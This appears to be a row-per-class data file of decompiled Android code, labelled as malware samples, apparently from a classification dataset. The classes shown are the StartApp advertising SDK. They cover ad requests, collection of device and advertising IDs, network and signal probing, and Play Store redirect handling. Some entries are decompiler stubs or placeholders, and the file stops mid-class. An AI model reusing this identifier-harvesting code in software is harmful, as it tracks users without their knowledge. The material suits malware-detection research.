"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\j.code","public class j extends b {   public j(  Context context,  com.startapp.android.publish.a.i iVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,iVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_OFFER_WALL);   }   @Override public GetAdRequest c(){     GetAdRequest c=super.c();     c.setAdsNumber(MetaData.INSTANCE.getMaxAds(this.a));     return c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\k.code","public class k extends c {   public k(  Context context,  com.startapp.android.publish.a.h hVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,hVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_OFFER_WALL);   }   @Override protected void a(  Ad ad){     List<AdDetails> a=((com.startapp.android.publish.a.h)ad).a();     com.startapp.android.publish.list3d.e.INSTANCE.a();     if (a != null) {       Iterator<AdDetails> it=a.iterator();       while (it.hasNext()) {         com.startapp.android.publish.list3d.e.INSTANCE.a(it.next());       }     }   }   @Override public GetAdRequest c(){     GetAdRequest c=super.c();     c.setAdsNumber(MetaData.INSTANCE.getMaxAds(this.a));     return c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\l.code","public class l extends b {   public l(  Context context,  com.startapp.android.publish.a.d dVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,dVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_OVERLAY);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\m.code","public class m extends c {   private Activity g;   public m(  Activity activity,  com.startapp.android.publish.a.k kVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(activity,kVar,adPreferences,adEventListener,AdPreferences.Placement.DEVICE_SIDEBAR);     this.g=activity;   }   @Override protected void a(  Ad ad){   }   @Override public void onPostExecute(  Boolean bool){     super.onPostExecute(bool);   }   @Override protected boolean a(  Object obj){     GetAdResponse getAdResponse=(GetAdResponse)obj;     if (obj == null) {       com.startapp.android.publish.e.i.a(6,""Error Empty Response"");       return false;     }     if (!getAdResponse.isValidResponse()) {       this.f=getAdResponse.getErrorMessage();       com.startapp.android.publish.e.i.a(6,""Error msg = ["" + this.f + ""]"");       return false;     }     com.startapp.android.publish.a.k kVar=(com.startapp.android.publish.a.k)this.b;     kVar.a(getAdResponse.getAdsDetails());     kVar.setAdInfoOverride(getAdResponse.getAdInfoOverride());     boolean z=getAdResponse.getAdsDetails() != null && getAdResponse.getAdsDetails().size() > 0;     if (!z) {       this.f=""Empty Response"";       return z;     }     com.startapp.android.publish.e.g.b((Context)this.g,""slideEvent"",(Boolean)false);     com.startapp.android.publish.e.g.b((Context)this.g,""trackingEvent"",(Boolean)false);     com.startapp.android.publish.e.g.b(this.g,""trackingUrl"",(String)null);     return z;   }   @Override public BaseResponse a(){     GetAdRequest c=super.c();     c.setAdsNumber(10);     try {       return (GetAdResponse)com.startapp.android.publish.d.b.a(this.a,com.startapp.android.publish.b.a(b.a.JSON),c,(Map<String,String>)null,GetAdResponse.class);     }  catch (    com.startapp.android.publish.e.n e) {       com.startapp.android.publish.e.i.a(6,""Unable to handle GetSearchBoxService!!!!"",e);       this.f=e.getMessage();       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\n.code","public class n extends b {   public n(  Context context,  com.startapp.android.publish.a.l lVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,lVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_SPLASH);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\o.code","public interface o {   void onFinishLoadingMeta(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.d\b.code","public class b {   public static <T extends BaseResponse>T a(  Context context,  String str,  BaseRequest baseRequest,  Map<String,String> map,  Class<T> cls){     StringBuilder sb=new StringBuilder();     a(context,str,baseRequest,map,sb);     return (T)a.INSTANCE.a(sb.toString(),cls);   }   public static String a(  Context context,  String str,  BaseRequest baseRequest,  Map<String,String> map){     StringBuilder sb=new StringBuilder();     a(context,str,baseRequest,map,sb);     return sb.toString();   }   private static Map<String,String> a(  Context context,  Map<String,String> map){     if (map == null) {       map=new HashMap<>();     }     String a=com.startapp.android.publish.e.b.a(context);     try {       a=URLEncoder.encode(a,""UTF-8"");     }  catch (    UnsupportedEncodingException e) {     }     map.put(""device-id"",a);     map.put(""Accept-Language"",Locale.getDefault().toString());     return map;   }   private static void a(  Context context,  String str,  BaseRequest baseRequest,  Map<String,String> map,  StringBuilder sb){     if (baseRequest != null) {       str=str + baseRequest.getRequestString();     }     i.a(""Transport"",3,""Sending get to URL: "" + str);     Map<String,String> a=a(context,map);     boolean z=false;     int i=1;     while (!z) {       try {         k.a(context,str,a,sb);         z=true;       }  catch (      n e) {         if (!e.a() || i >= 3) {           throw e;         }         i++;       }     }   }   public static boolean a(  Context context,  String str,  Map<String,String> map){     a(context,str,(BaseRequest)null,map,(StringBuilder)null);     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\a.code","public final class a { public static final class C0055a {     private final String a;     private final boolean b;     C0055a(    String str,    boolean z){       this.a=str;       this.b=z;     }     public String a(){       return this.a;     }     public boolean b(){       return this.b;     }   } public static final class b implements ServiceConnection {     boolean a;     private final LinkedBlockingQueue<IBinder> b;     private b(){       this.a=false;       this.b=new LinkedBlockingQueue<>(1);     }     public IBinder a(){       if (this.a) {         throw new IllegalStateException();       }       this.a=true;       return this.b.take();     }     @Override public void onServiceConnected(    ComponentName componentName,    IBinder iBinder){       try {         this.b.put(iBinder);       }  catch (      InterruptedException e) {       }     }     @Override public void onServiceDisconnected(    ComponentName componentName){     }   } public static final class c implements IInterface {     private IBinder a;     public c(    IBinder iBinder){       this.a=iBinder;     }     public String a(){       Parcel obtain=Parcel.obtain();       Parcel obtain2=Parcel.obtain();       try {         obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");         this.a.transact(1,obtain,obtain2,0);         obtain2.readException();         return obtain2.readString();       }   finally {         obtain2.recycle();         obtain.recycle();       }     }     public boolean a(    boolean z){       Parcel obtain=Parcel.obtain();       Parcel obtain2=Parcel.obtain();       try {         obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");         obtain.writeInt(z ? 1 : 0);         this.a.transact(2,obtain,obtain2,0);         obtain2.readException();         return obtain2.readInt() != 0;       }   finally {         obtain2.recycle();         obtain.recycle();       }     }     @Override public IBinder asBinder(){       return this.a;     }   }   public static String a(  Context context){     try {       C0055a b2=b(context);       return !b2.b() ? b2.a() : ""1"";     }  catch (    Exception e) {       StackTraceElement[] stackTrace=e.getStackTrace();       i.a(3,""Error getting advertising id. stackTrace:"");       for (      StackTraceElement stackTraceElement : stackTrace) {         i.a(3,stackTraceElement.toString());       }       return ""0"";     }   }   private static C0055a b(  Context context){     if (Looper.myLooper() == Looper.getMainLooper()) {       throw new IllegalStateException(""Cannot be called from the main thread"");     }     try {       context.getPackageManager().getPackageInfo(""com.android.vending"",0);       b bVar=new b();       Intent intent=new Intent(""com.google.android.gms.ads.identifier.service.START"");       intent.setPackage(""com.google.android.gms"");       if (!context.getApplicationContext().bindService(intent,bVar,1)) {         throw new IOException(""Google Play connection failed"");       }       try {         try {           c cVar=new c(bVar.a());           return new C0055a(cVar.a(),cVar.a(true));         }  catch (        Exception e) {           throw e;         }       }   finally {         context.getApplicationContext().unbindService(bVar);       }     }  catch (    Exception e2) {       throw e2;     }   } } public interface a {   void a(  int i); } public interface a {   void a(  Bitmap bitmap,  int i); } static class a extends FilterInputStream {   public a(  InputStream inputStream){     super(inputStream);   }   @Override public long skip(  long j){     long j2=0;     while (j2 < j) {       long skip=this.in.skip(j - j2);       if (skip == 0) {         if (read() < 0) {           break;         }         skip=1;       }       j2=skip + j2;     }     return j2;   } } public static class a extends WebViewClient {   private String a;   private boolean b=false;   private boolean c=false;   private int d;   private ProgressDialog e;   private Runnable f;   private Context g;   public a(  Context context,  int i,  ProgressDialog progressDialog,  String str,  Runnable runnable){     this.a="""";     this.g=context;     this.d=i;     this.e=progressDialog;     this.a=str;     this.f=runnable;   }   private void a(){     new Thread(new Runnable(){       @Override public void run(){         try {           Thread.sleep(a.this.d);         }  catch (        InterruptedException e) {         }         if (a.this.b) {           return;         }         p.f();         p.b(a.this.g,a.this.a);         if (a.this.f != null) {           a.this.f.run();         }       }     } ).start();   }   @Override public void onPageFinished(  WebView webView,  String str){     i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");     super.onPageFinished(webView,str);   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");     super.onPageStarted(webView,str,bitmap);     if (this.c) {       return;     }     a();     this.c=true;   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     i.a(2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");     super.onReceivedError(webView,i,str,str2);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     String lowerCase;     i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");     try {       this.a=str;       lowerCase=str.toLowerCase();     }  catch (    Exception e) {       i.a(6,""StartAppWall.UtilExcpetion - view to attached to window - Load Progress"");     }     if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com""))) {       return false;     }     this.b=true;     p.f();     p.b(this.g,str);     if (this.f != null) {       this.f.run();     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\b.code","public static final class b implements ServiceConnection {   boolean a;   private final LinkedBlockingQueue<IBinder> b;   private b(){     this.a=false;     this.b=new LinkedBlockingQueue<>(1);   }   public IBinder a(){     if (this.a) {       throw new IllegalStateException();     }     this.a=true;     return this.b.take();   }   @Override public void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     try {       this.b.put(iBinder);     }  catch (    InterruptedException e) {     }   }   @Override public void onServiceDisconnected(  ComponentName componentName){   } } public class b {   public static String a(  Context context){     SharedPreferences sharedPreferences=context.getSharedPreferences(""com.startapp.android.publish"",0);     String string=sharedPreferences.getString(""uniqueId"",null);     if (string == null) {       string=Settings.Secure.getString(context.getContentResolver(),""android_id"");       if (""9774d56d682e549c"".equals(string) || string == null) {         string=UUID.randomUUID().toString();       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(""uniqueId"",string);       edit.commit();     }     return string;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\c.code","public static final class c implements IInterface {   private IBinder a;   public c(  IBinder iBinder){     this.a=iBinder;   }   public String a(){     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");       this.a.transact(1,obtain,obtain2,0);       obtain2.readException();       return obtain2.readString();     }   finally {       obtain2.recycle();       obtain.recycle();     }   }   public boolean a(  boolean z){     Parcel obtain=Parcel.obtain();     Parcel obtain2=Parcel.obtain();     try {       obtain.writeInterfaceToken(""com.google.android.gms.ads.identifier.internal.IAdvertisingIdService"");       obtain.writeInt(z ? 1 : 0);       this.a.transact(2,obtain,obtain2,0);       obtain2.readException();       return obtain2.readInt() != 0;     }   finally {       obtain2.recycle();       obtain.recycle();     }   }   @Override public IBinder asBinder(){     return this.a;   } } !org.eclipse.jdt.core.dom.TypeDeclaration@37d37e0c"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\C0055a.code","public static final class C0055a {   private final String a;   private final boolean b;   C0055a(  String str,  boolean z){     this.a=str;     this.b=z;   }   public String a(){     return this.a;   }   public boolean b(){     return this.b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\d.code","public class d {   private static final Map<String,Bitmap> a=new HashMap();   public static Bitmap a(  Context context,  String str){     Bitmap a2=a(context,str,false);     return a2 == null ? a(context,str,true) : a2;   }   private static Bitmap a(  Context context,  String str,  boolean z){     FileInputStream fileInputStream;     FileInputStream fileInputStream2;     FileInputStream fileInputStream3=null;     Bitmap bitmap=a.get(str);     if (bitmap != null) {       return bitmap;     }     m.a(context,z);     try {       fileInputStream2=new FileInputStream(context.getFilesDir().getPath() + ""/"" + str);     }  catch (    Exception e) {       fileInputStream=null;     } catch (    Throwable th) {       th=th;     }     try {       Bitmap decodeStream=BitmapFactory.decodeStream(fileInputStream2);       decodeStream.setDensity(context.getResources() != null ? context.getResources().getDisplayMetrics().densityDpi : 160);       a.put(str,decodeStream);       if (fileInputStream2 == null) {         return decodeStream;       }       try {         fileInputStream2.close();         return decodeStream;       }  catch (      IOException e2) {         return decodeStream;       }     }  catch (    Exception e3) {       fileInputStream=fileInputStream2;       if (fileInputStream != null) {         try {           fileInputStream.close();         }  catch (        IOException e4) {         }       }       return null;     } catch (    Throwable th2) {       th=th2;       fileInputStream3=fileInputStream2;       if (fileInputStream3 != null) {         try {           fileInputStream3.close();         }  catch (        IOException e5) {         }       }       throw th;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\e.code","public class e extends AsyncTask<Void,Void,Bitmap> {   private String a;   private a b;   private int c; public interface a {     void a(    Bitmap bitmap,    int i);   }   public e(  String str,  a aVar,  int i){     this.a=str;     this.b=aVar;     this.c=i;   }   @Override public Bitmap doInBackground(  Void... voidArr){     return f.a(this.a);   }   @Override public void onPostExecute(  Bitmap bitmap){     if (this.b != null) {       this.b.a(bitmap,this.c);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\f.code","public class f { static class a extends FilterInputStream {     public a(    InputStream inputStream){       super(inputStream);     }     @Override public long skip(    long j){       long j2=0;       while (j2 < j) {         long skip=this.in.skip(j - j2);         if (skip == 0) {           if (read() < 0) {             break;           }           skip=1;         }         j2=skip + j2;       }       return j2;     }   }   public static Bitmap a(  String str){     Bitmap bitmap;     HttpURLConnection httpURLConnection=null;     try {       HttpURLConnection httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         try {           httpURLConnection2.connect();           InputStream inputStream=httpURLConnection2.getInputStream();           BufferedInputStream bufferedInputStream=new BufferedInputStream(inputStream);           Bitmap decodeStream=BitmapFactory.decodeStream(new a(inputStream));           try {             bufferedInputStream.close();             inputStream.close();             if (httpURLConnection2 == null) {               return decodeStream;             }             httpURLConnection2.disconnect();             return decodeStream;           }  catch (          Exception e) {             bitmap=decodeStream;             httpURLConnection=httpURLConnection2;             if (httpURLConnection == null) {               return bitmap;             }             httpURLConnection.disconnect();             return bitmap;           }         }  catch (        Throwable th) {           httpURLConnection=httpURLConnection2;           th=th;           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           throw th;         }       }  catch (      Exception e2) {         bitmap=null;         httpURLConnection=httpURLConnection2;       }     }  catch (    Exception e3) {       bitmap=null;     } catch (    Throwable th2) {       th=th2;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\g.code","public class g {   private static SharedPreferences a=null;   private static SharedPreferences a(  Context context){     if (a == null) {       a=context.getApplicationContext().getSharedPreferences(""com.startapp.android.publish"",0);     }     return a;   }   public static Boolean a(  Context context,  String str,  Boolean bool){     return Boolean.valueOf(a(context).getBoolean(str,bool.booleanValue()));   }   public static String a(  Context context,  String str,  String str2){     return a(context).getString(str,str2);   }   public static void b(  Context context,  String str,  Boolean bool){     a(context).edit().putBoolean(str,bool.booleanValue()).commit();   }   public static void b(  Context context,  String str,  String str2){     a(context).edit().putString(str,str2).commit();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\h.code","public class h extends Shape {   private RectF a=new RectF();   @Override public h clone(){     h hVar=(h)super.clone();     hVar.a=new RectF(this.a);     return hVar;   }   @Override public void draw(  Canvas canvas,  Paint paint){     canvas.drawRect(this.a,paint);     Paint paint2=new Paint(1);     paint2.setColor(-1);     paint2.setStrokeWidth(4.0f);     paint2.setStyle(Paint.Style.STROKE);     canvas.drawRect(this.a,paint2);   }   @Override protected void onResize(  float f,  float f2){     this.a.set(0.0f,0.0f,f,f2);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\i.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5451fa5b"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\j.code","public class j {   private static j a=null;   private Context b;   private String c=""e106"";   private PhoneStateListener d=new PhoneStateListener(){     @Override public void onSignalStrengthsChanged(    SignalStrength signalStrength){       try {         Method method=SignalStrength.class.getMethod(""getLevel"",null);         j.this.c=Integer.toString(((Integer)method.invoke(signalStrength,(Object[])null)).intValue());       }  catch (      IllegalAccessException e) {         j.this.c=""e105"";       } catch (      IllegalArgumentException e2) {         j.this.c=""e105"";       } catch (      NoSuchMethodException e3) {         j.this.c=""e104"";       } catch (      InvocationTargetException e4) {         j.this.c=""e105"";       }     }   } ;   private j(  Context context){     this.b=context.getApplicationContext();     ((TelephonyManager)context.getSystemService(""phone"")).listen(this.d,android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY);   }   public static j a(){     return a;   }   public static void a(  Context context){     if (a == null) {       a=new j(context);     }   }   public String a(  String str){     return str.toLowerCase().compareTo(""WIFI"".toLowerCase()) == 0 ? k.b(this.b) : this.c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\k.code","public class k { static {     if (Build.VERSION.SDK_INT < 8) {       System.setProperty(""http.keepAlive"",""false"");     }   }   public static String a(  Context context){     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     if (connectivityManager == null) {       return ""e100"";     }     NetworkInfo activeNetworkInfo=connectivityManager.getActiveNetworkInfo();     if (activeNetworkInfo == null || !activeNetworkInfo.isConnected()) {       return ""e102"";     }     String typeName=activeNetworkInfo.getTypeName();     if (typeName.toLowerCase().compareTo(""WIFI"".toLowerCase()) == 0) {       return ""WIFI"";     }     if (typeName.toLowerCase().compareTo(""MOBILE"".toLowerCase()) != 0) {       return ""e100"";     }     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     return telephonyManager != null ? Integer.toString(telephonyManager.getNetworkType()) : ""e101"";   }   private static HttpURLConnection a(  Context context,  String str,  byte[] bArr,  Map<String,String> map){     HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();     httpURLConnection.addRequestProperty(""Cache-Control"",""no-cache"");     String a=g.a(context,""User-Agent"",""-1"");     if (a.compareTo(""-1"") != 0) {       httpURLConnection.addRequestProperty(""User-Agent"",a);     }     if (bArr != null) {       httpURLConnection.setRequestMethod(""POST"");       httpURLConnection.setDoOutput(true);       httpURLConnection.setFixedLengthStreamingMode(bArr.length);       httpURLConnection.setRequestProperty(""Content-Type"",""application/json"");     }  else {       httpURLConnection.setRequestMethod(""GET"");     }     httpURLConnection.setRequestProperty(""Accept"",""application/json;text/html;text/plain"");     httpURLConnection.setReadTimeout(10000);     httpURLConnection.setConnectTimeout(10000);     return httpURLConnection;   }   public static boolean a(  android.content.Context r12,  java.lang.String r13,  java.util.Map<java.lang.String,java.lang.String> r14,  java.lang.StringBuilder r15){     throw new UnsupportedOperationException(""Method not decompiled: com.startapp.android.publish.e.k.a(android.content.Context, java.lang.String, java.util.Map, java.lang.StringBuilder):boolean"");   }   public static String b(  Context context){     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     if (connectivityManager == null) {       return ""e100"";     }     NetworkInfo activeNetworkInfo=connectivityManager.getActiveNetworkInfo();     return (activeNetworkInfo == null || !activeNetworkInfo.isConnected()) ? ""e102"" : activeNetworkInfo.getTypeName().compareTo(""WIFI"") == 0 ? Integer.toString(WifiManager.calculateSignalLevel(((WifiManager)context.getSystemService(""wifi"")).getConnectionInfo().getRssi(),5)) : ""e103"";   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\l.code","public class l extends LinearLayout {   public l(  Context context){     super(context);   }   private void a(  String str){     int a=o.a(getContext(),2);     int a2=o.a(getContext(),5);     ImageView imageView=new ImageView(getContext());     imageView.setImageBitmap(d.a(getContext(),str));     imageView.setPadding(a,0,0,a2);     addView(imageView);   }   public void setRating(  float f){     removeAllViews();     float round=Math.round(f * 2.0f) / 2.0f;     int floor=(int)Math.floor(round);     boolean z=round - ((float)floor) == 0.5f;     int i=(5 - floor) - (z ? 1 : 0);     for (int i2=0; i2 < floor; i2++) {       a(""filled_star.png"");     }     if (z) {       a(""half_star.png"");     }     for (int i3=0; i3 < i; i3++) {       a(""empty_star.png"");     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\m.code","public class m {   private static boolean a=true;   public static Typeface a(  Context context,  String str){     a(context,true);     return Typeface.createFromFile(new File(context.getFilesDir().getPath() + ""/"" + str));   }   protected static void a(  android.content.Context r5,  boolean r6){     throw new UnsupportedOperationException(""Method not decompiled: com.startapp.android.publish.e.m.a(android.content.Context, boolean):void"");   }   protected static boolean a(  String str,  String str2,  String str3){     FileOutputStream fileOutputStream;     ZipEntry zipEntry;     InputStream inputStream=null;     try {       ZipFile zipFile=new ZipFile(str);       Enumeration<? extends ZipEntry> entries=zipFile.entries();       while (true) {         if (!entries.hasMoreElements()) {           zipEntry=null;           break;         }         zipEntry=entries.nextElement();         if (!zipEntry.isDirectory() && zipEntry.getName().equals(str2)) {           break;         }       }       if (zipEntry == null) {         return false;       }       InputStream inputStream2=zipFile.getInputStream(zipEntry);       try {         fileOutputStream=new FileOutputStream(str3);         try {           byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY];           while (true) {             int read=inputStream2.read(bArr);             if (read <= 0) {               break;             }             fileOutputStream.write(bArr,0,read);           }           fileOutputStream.flush();           try {             inputStream2.close();             fileOutputStream.close();           }  catch (          IOException e) {           }           return true;         }  catch (        IOException e2) {           inputStream=inputStream2;           try {             inputStream.close();             fileOutputStream.close();           }  catch (          IOException e3) {           }           return false;         }       }  catch (      IOException e4) {         fileOutputStream=null;         inputStream=inputStream2;       }     }  catch (    IOException e5) {       fileOutputStream=null;     }   }   public static String b(  Context context,  String str){     a(context,false);     return ""file://"" + context.getFilesDir().getPath() + ""/""+ str;   }   protected static void c(  Context context,  String str){     ZipInputStream zipInputStream;     Throwable th;     FileOutputStream fileOutputStream;     ZipInputStream zipInputStream2;     FileOutputStream fileOutputStream2=null;     byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];     try {       zipInputStream=new ZipInputStream(new FileInputStream(str));       try {         try {           fileOutputStream=null;           for (ZipEntry nextEntry=zipInputStream.getNextEntry(); nextEntry != null; nextEntry=zipInputStream.getNextEntry()) {             try {               fileOutputStream2=new FileOutputStream(context.getFilesDir().getPath() + ""/"" + nextEntry.getName());               while (true) {                 try {                   int read=zipInputStream.read(bArr,0,android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT);                   if (read <= -1) {                     break;                   }  else {                     fileOutputStream2.write(bArr,0,read);                   }                 }  catch (                IOException e) {                   fileOutputStream=fileOutputStream2;                   try {                     fileOutputStream.close();                   }  catch (                  IOException e2) {                   }                   try {                     zipInputStream.close();                     return;                   }  catch (                  IOException e3) {                     return;                   }                 } catch (                Throwable th2) {                   fileOutputStream=fileOutputStream2;                   th=th2;                   try {                     fileOutputStream.close();                   }  catch (                  IOException e4) {                   }                   try {                     zipInputStream.close();                     throw th;                   }  catch (                  IOException e5) {                     throw th;                   }                 }               }               fileOutputStream2.close();               zipInputStream.closeEntry();               fileOutputStream=fileOutputStream2;             }  catch (            FileNotFoundException e6) {               fileOutputStream2=fileOutputStream;               zipInputStream2=zipInputStream;               try {                 fileOutputStream2.close();               }  catch (              IOException e7) {               }               try {                 zipInputStream2.close();                 return;               }  catch (              IOException e8) {                 return;               }             } catch (            IOException e9) {             } catch (            Throwable th3) {               th=th3;             }           }           try {             fileOutputStream.close();           }  catch (          IOException e10) {           }           try {             zipInputStream.close();           }  catch (          IOException e11) {           }         }  catch (        FileNotFoundException e12) {           zipInputStream2=zipInputStream;         }       }  catch (      IOException e13) {         fileOutputStream=null;       } catch (      Throwable th4) {         fileOutputStream=null;         th=th4;       }     }  catch (    FileNotFoundException e14) {       zipInputStream2=null;     } catch (    IOException e15) {       fileOutputStream=null;       zipInputStream=null;     } catch (    Throwable th5) {       zipInputStream=null;       th=th5;       fileOutputStream=null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\n.code","public class n extends Exception {   private boolean a;   public n(){     this.a=false;   }   public n(  String str,  Throwable th){     this(str,th,false);   }   public n(  String str,  Throwable th,  boolean z){     super(str,th);     this.a=false;     this.a=z;   }   public boolean a(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\o.code","public class o {   public static int a(  Context context,  int i){     return (int)((context.getResources().getDisplayMetrics().density * i) + 0.5f);   }   public static View a(  Context context){     float f=context.getResources().getDisplayMetrics().density;     LinearLayout linearLayout=new LinearLayout(context);     h hVar=new h();     ShapeDrawable shapeDrawable=new ShapeDrawable();     shapeDrawable.setShape(hVar);     shapeDrawable.getPaint().setColor(-805306368);     FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-2,-2);     layoutParams.gravity=17;     linearLayout.setLayoutParams(layoutParams);     linearLayout.setOrientation(0);     linearLayout.setBaselineAligned(false);     linearLayout.setBackgroundDrawable(shapeDrawable);     linearLayout.setPadding((int)((8.0f * f) + 0.5f),(int)((10.0f * f) + 0.5f),(int)((8.0f * f) + 0.5f),(int)((10.0f * f) + 0.5f));     ProgressBar progressBar=new ProgressBar(context);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.setMargins(0,0,(int)((f * 12.0f) + 0.5f),0);     progressBar.setLayoutParams(layoutParams2);     progressBar.setMax(10000);     TextView textView=new TextView(context);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.gravity=16;     textView.setLayoutParams(layoutParams3);     textView.setText(""Loading..."");     linearLayout.addView(progressBar);     linearLayout.addView(textView);     return linearLayout;   }   public static void a(  TextView textView,  Set<String> set){     if (set.contains(MetaData.TEXT_DECORATION_UNDERLINE)) {       textView.setPaintFlags(textView.getPaintFlags() | 8);     }     int i=0;     if (set.contains(MetaData.TEXT_DECORATION_BOLD) && set.contains(MetaData.TEXT_DECORATION_ITALIC)) {       i=3;     }  else     if (set.contains(MetaData.TEXT_DECORATION_BOLD)) {       i=1;     }  else     if (set.contains(MetaData.TEXT_DECORATION_ITALIC)) {       i=2;     }     textView.setTypeface(null,i);   }   public static int b(  Context context,  int i){     return (int)((i - 0.5f) / context.getResources().getDisplayMetrics().density);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.e\p.code","public class p {   private static ProgressDialog a;   private static Context b=null;   private static boolean c=false; public static class a extends WebViewClient {     private String a;     private boolean b=false;     private boolean c=false;     private int d;     private ProgressDialog e;     private Runnable f;     private Context g;     public a(    Context context,    int i,    ProgressDialog progressDialog,    String str,    Runnable runnable){       this.a="""";       this.g=context;       this.d=i;       this.e=progressDialog;       this.a=str;       this.f=runnable;     }     private void a(){       new Thread(new Runnable(){         @Override public void run(){           try {             Thread.sleep(a.this.d);           }  catch (          InterruptedException e) {           }           if (a.this.b) {             return;           }           p.f();           p.b(a.this.g,a.this.a);           if (a.this.f != null) {             a.this.f.run();           }         }       } ).start();     }     @Override public void onPageFinished(    WebView webView,    String str){       i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");       super.onPageFinished(webView,str);     }     @Override public void onPageStarted(    WebView webView,    String str,    Bitmap bitmap){       i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");       super.onPageStarted(webView,str,bitmap);       if (this.c) {         return;       